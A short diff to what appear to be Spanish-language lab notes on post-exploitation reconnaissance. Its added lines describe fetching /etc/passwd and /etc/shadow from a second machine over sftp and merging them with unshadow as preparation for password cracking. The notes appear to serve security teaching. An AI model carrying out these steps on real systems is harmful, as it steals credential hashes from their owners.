@@ -16,3 +16,14 @@ ejecutar comandos, tales como:
 ---- cd /var/mail/ (De ser un servidor web permite ver información relacionada al 
 sistema y los usuarios)
 ---- dpkg -l (En distribuciones basadas en Debian permite ver el listado de los paquetes instalados)
+
+
+++ Descargar archivos passwd y shadow del PC2
+++ PC1: sftp <nombre_usuario>@<ip_PC2>
+++ PC1: cd /etc/
+++ PC1: get passwd
+++ PC1: get shadow
+++ PC1: Ir al directorio home u otro para ubicar ambos archivos 
+++ PC1: unshadow passwd shadow > <nombre_archivo_combinado>
+++ 
+
